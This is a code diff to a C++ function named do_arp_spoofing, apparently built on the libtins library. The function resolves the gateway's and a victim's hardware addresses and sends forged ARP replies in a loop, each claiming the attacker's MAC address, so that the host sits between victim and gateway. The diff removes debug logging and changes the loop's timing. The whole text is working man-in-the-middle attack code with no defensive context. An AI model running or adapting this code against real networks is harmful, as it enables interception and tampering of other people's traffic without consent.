@@ -59,17 +59,13 @@ void do_arp_spoofing(
     // Get own interface hardware address.
     HWAddress<6> own_hw = iface.info().hw_addr;
     cout << "Using own hw address: " << own_hw << endl;
-    //LOGD("Using own hw address: %s\n", own_hw.to_string().c_str());
     // Resolves gateway's hardware address.
     gw_hw = Utils::resolve_hwaddr(iface, gw, sender);
     cout << "Using gateway hw address: " << gw_hw << endl;
-    //LOGD("Using gateway hw address: %s\n", gw_hw.to_string().c_str());
-    sleep(1);
+    //std::this_thread::sleep_for(std::chrono::milliseconds(500));
     // Resolves victim's hardware address.
     victim_hw = Utils::resolve_hwaddr(iface, victim, sender);
     cout << "Using victim hw address: " << victim_hw << endl;
-    //LOGD("Using victim hw address: %s\n", victim_hw.to_string().c_str());
-    sleep(1);
     // We tell the gateway that the victim is at our hw address,
     // and tell the victim that the gateway is at our hw address
     ARP gw_arp(gw, victim, gw_hw, own_hw),
@@ -88,7 +84,8 @@ void do_arp_spoofing(
     while (spoofing.load()) {
         sender.send(to_gw, iface);
         sender.send(to_victim, iface);
-        try_get_input();
+        sleep(5);
+        //try_get_input();
     }
 }
 
